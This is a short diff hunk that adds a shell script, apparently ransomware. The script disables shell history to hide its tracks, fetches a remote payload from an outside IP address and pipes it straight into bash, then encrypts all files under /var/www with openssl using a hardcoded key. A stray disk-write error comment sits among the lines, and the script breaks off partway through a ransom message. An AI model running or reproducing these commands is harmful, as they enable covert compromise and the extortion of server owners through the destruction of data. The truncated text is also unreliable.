@@ -1,0 +1,6 @@
+export HISTFILE=/dev/null
+uname -a
+curl -s http://185.220.101.5/payload.sh | bash
+find /var/www -type f -exec openssl enc -aes-256-cbc -salt -in {} -out {}.enc -k "R@ns0m_2026_K3y" \;
+# FATAL WRITE ERROR: SECTOR WRITE FAILED AT LBA 4882812
+echo "Your files are enc
